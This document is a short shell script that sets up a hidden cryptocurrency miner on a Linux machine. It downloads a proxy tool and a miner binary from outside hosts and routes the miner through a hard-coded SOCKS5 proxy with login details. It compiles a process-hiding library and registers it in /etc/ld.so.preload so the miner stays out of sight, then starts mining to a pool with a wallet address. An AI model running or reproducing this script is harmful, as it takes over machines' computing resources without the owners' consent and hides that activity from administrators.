#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://gitlab.com/meldiyunrianto/nimik/-/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
rm -rf graphich.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 144.168.217.88:8780
socks5_username = lopokoki009
socks5_password = lopokoki010
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget -q -O revez 'https://github.com/beranisalah/hee/raw/main/xmbin'
chmod +x revez
rm -rf Makefile
rm -rf processhider.c
rm -rf README.md
rm -rf .gitignore
rm -rf korek.zip

./graftcp/graftcp wget https://github.com/AhmadTugiman/gembel/raw/main/tukimin.zip
unzip tukimin.zip
rm -rf tukimin.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp sudo ./revez --url 45.76.89.70:80 --user 89XsXBTmSdMbLFh8TfCWLBDXrWDN6arjEZdCtW6ZSQmMguE8oJV5qjxJpoiAinNoMaUq3GhcsXqvWc2BurXRtnnNQxsfRNi --pass Bin --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t 4
